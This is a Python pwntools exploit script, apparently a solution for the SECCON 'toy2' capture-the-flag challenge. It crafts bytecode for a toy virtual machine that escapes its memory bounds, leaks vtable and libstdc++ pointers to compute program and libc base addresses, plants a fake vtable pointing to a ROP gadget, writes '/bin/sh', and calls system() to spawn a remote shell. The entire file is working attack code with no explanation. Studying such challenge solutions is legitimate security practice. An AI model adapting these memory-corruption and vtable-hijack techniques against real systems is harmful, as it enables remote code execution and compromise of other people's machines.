#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "toy-2.seccon.games"
# HOST = "localhost"
PORT = 5000
PROCESS = "./toy2"


def op(first, second):
    val = first << 12
    val |= second
    return p16(val)


def jmp(addr):
    return op(0, addr)


def adc(addr):
    return op(1, addr)


def xor(addr):
    return op(2, addr)


def sbc(addr):
    return op(3, addr)


def ror():
    return op(4, 0)


def tat():
    return op(5, 0)


def oor(addr):
    return op(6, addr)


def oand(addr):
    return op(8, addr)


def ldc(addr):
    return op(9, addr)


def bcc(addr):
    return op(10, addr)


def bne(addr):
    return op(11, addr)


def ldi():
    return op(12, 0)


def stt():
    return op(13, 0)


def lda(addr):
    return op(14, addr)


def sta(addr):
    return op(15, addr)


def exploit(r):
    # code segment

    # move _mem ptr down
    code = lda(0xf00)
    code += tat()
    code += lda(0xf02)
    code += stt()

    # padding for moved mem ptr
    code += b"\x00" * 16

    # overwrite _mem size
    code += lda(0xf04 - 0x10)
    code += sta(0x1000 + 8 - 0x10)

    # padding to increase pc
    code += ror() * 16

    # move _mem ptr up
    code += lda(0xf06 - 0x10)
    code += sta(0x1000 - 1 - 0x10)

    # read vtable and calculate offset to main
    code += lda(-0x8 + 0x8)             # read original vtable (lower 2 bytes)
    code += sbc(0xf08 + 0x8)            # calculate elf base
    code += adc(0xf0a + 0x8)            # calculate main
    code += sta(0xe00 + 0x8)            # write into mem
    code += lda(-0x8 + 0x2 + 0x8)       # read original vtable (next 2 bytes)
    code += sta(0xe00 + 0x2 + 0x8)      # write into mem
    code += lda(-0x8 + 0x4 + 0x8)       # read original vtable (next 2 bytes)
    code += sta(0xe00 + 0x4 + 0x8)      # write into mem

    # overwrite vtable ptr
    code += lda(0xf0c + 0x8)            # load offset to _mem ptr
    code += ldi()                       # read lower 2 bytes of _mem ptr
    code += adc(0xf12 + 0x8)            # add offset to fake vtable
    code += sta(-0x8 + 0x8)             # overwrite vtable

    code += lda(0xf0e + 0x8)            # copy _mem ptr+2 to vtable+2
    code += ldi()
    code += sta(-0x8 + 0x2 + 0x8)
    code += lda(0xf10 + 0x8)            # copy _mem ptr+4 to vtable+4
    code += ldi()
    code += sta(-0x8 + 0x4 + 0x8)

    # trigger invalid instruction
    code += op(7, 0)

    # data segment
    code = code.ljust(0xf00, b"\x00")
    code += p16(0xc800)                 # 0xf00 LSB overwrite value (move down)
    code += p16(0xfff)                  # 0xf02 Target address (overwrite _mem ptr)
    code += p16(0xffff)                 # 0xf04 new _mem_size
    code += p16(0xb000)                 # 0xf06 LSB overwrite value (move up)

    code += p16(0x4c70)                 # 0xf08 original vtable offset
    code += p16(0x26d0)                 # 0xf0a offset to main

    code += p16(0x1000 + 0x8)           # 0xf0c offset to _mem ptr
    code += p16(0x1000 + 0x2 + 0x8)     # 0xf0e offset to _mem ptr + 2
    code += p16(0x1000 + 0x4 + 0x8)     # 0xf10 offset to _mem ptr + 4
    code += p16(0xe00)                  # 0xf12 offset to fake vtable

    code = code.ljust(4096, b"\x00")

    r.send(code)

    r.recvuntil(b"[+] Done.")

    # move _mem ptr down
    code = lda(0xf00)
    code += tat()
    code += lda(0xf02)
    code += stt()

    # padding for moved mem ptr
    code += b"\x00" * 16

    # overwrite _mem size
    code += lda(0xf04 - 0x10)
    code += sta(0x1000 + 8 - 0x10)

    # padding to increase pc
    code += ror() * 80

    # move _mem ptr up
    code += lda(0xf06 - 0x10)
    code += sta(0x1000 - 1 - 0x10)

    LIBCOFFSET = 0x4aeff0

    # read libstdc++ pointer and calculate libc base and store in _mem
    code += lda(0x10)                  # bytes 0-2
    code += sbc(0xf08 + 0x78)
    code += sta(0x400 + 0x78)

    code += lda(0x12)                  # bytes 2-4
    code += sbc(0xf0a + 0x78)
    code += sta(0x402 + 0x78)

    code += lda(0x14)                  # bytes 4-6
    code += sta(0x404 + 0x78)

    # 0x000000000016e44e: mov rdi, r14; call qword ptr [rax + 0x10];
    GADGETOFFSET = 0x16e44e

    # write fake vtable with gadget
    code += lda(0x400 + 0x78)           # libc base
    code += adc(0xf0c + 0x78)           # add gadget offset
    code += sta(0x410 + 0x78)           # fake vtable

    code += lda(0x402 + 0x78)           # libc base
    code += adc(0xf0e + 0x78)           # add gadget offset
    code += sta(0x412 + 0x78)           # fake vtable

    code += lda(0x404 + 0x78)           # libc base
    code += sta(0x414 + 0x78)           # fake vtable

    # write binsh string to _mem
    BINSH = 0x0068732f6e69622f

    code += lda(0xf10 + 0x78)
    code += sta(0x10)
    code += lda(0xf12 + 0x78)
    code += sta(0x12)
    code += lda(0xf14 + 0x78)
    code += sta(0x14)
    code += lda(0xf16 + 0x78)
    code += sta(0x16)

    # write system+0x1b to rax+0x10
    SYSTEMOFFSET = libc.symbols["system"] + 0x1b

    code += lda(0x400 + 0x78)           # libc base
    code += adc(0xf18 + 0x78)           # add system offset
    code += sta(0x418 + 0x78)           # store at 0x418

    code += lda(0x402 + 0x78)           # libc base
    code += adc(0xf1a + 0x78)           # add system offset
    code += sta(0x418 + 0x2 + 0x78)     # store at 0x418+2

    code += lda(0x404 + 0x78)           # libc base
    code += sta(0x418 + 0x4 + 0x78)     # store at 0x418+4

    # overwrite vtable with fake vtable
    code += lda(0xf1c + 0x78)           # get _mem_ptr
    code += ldi()
    code += adc(0xf22 + 0x78)           # add offset to fake vtable
    code += sta(0x70)                   # overwrite vtable

    code += lda(0xf1e + 0x78)           # get _mem_ptr+2
    code += ldi()
    code += sta(0x70 + 0x2)

    code += lda(0xf20 + 0x78)           # get _mem_ptr+4
    code += ldi()
    code += sta(0x70 + 0x4)

    # data segment
    code = code.ljust(0xf00, b"\x00")
    code += p16(0xd800)                 # 0xf00 LSB overwrite value (move down)
    code += p16(0xfff)                  # 0xf02 Target address (overwrite _mem ptr)
    code += p16(0xffff)                 # 0xf04 new _mem_size
    code += p16(0x5000)                 # 0xf06 LSB overwrite value (move up)

    code += p16(LIBCOFFSET & 0xffff)            # 0xf08 libc offset (0-16)
    code += p16((LIBCOFFSET >> 16) & 0xffff)    # 0xf0a libc offset (16-32)

    code += p16(GADGETOFFSET & 0xffff)          # 0xf0c gadget offset (0-16)
    code += p16((GADGETOFFSET >> 16) & 0xffff)  # 0xf0e gadget offset (16-32)

    code += p16(BINSH & 0xffff)                 # 0xf10 binsh (0-16)
    code += p16((BINSH >> 16) & 0xffff)         # 0xf12 binsh (16-32)
    code += p16((BINSH >> 32) & 0xffff)         # 0xf14 binsh (32-48)
    code += p16((BINSH >> 48) & 0xffff)         # 0xf16 binsh (48-64)

    code += p16(SYSTEMOFFSET & 0xffff)          # 0xf18 system offset (0-16)
    code += p16((SYSTEMOFFSET >> 16) & 0xffff)  # 0xf1a system offset (16-32)

    code += p16(0x1000 + 0x78)                  # 0xf1c _mem_ptr
    code += p16(0x1000 + 0x2 + 0x78)            # 0xf1e _mem_ptr+2
    code += p16(0x1000 + 0x4 + 0x78)            # 0xf20 _mem_ptr+4

    code += p16(0x480)                          # 0xf22 offset to fake vtable
    code = code.ljust(4096, b"\x00")

    pause()
    r.send(code)

    r.interactive()

    return


if __name__ == "__main__":
    libc = ELF("./libc.so.6")

    context.terminal = ["tmux", "splitw", "-v"]

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = remote("localhost", 5000)
        pause()

    exploit(r)
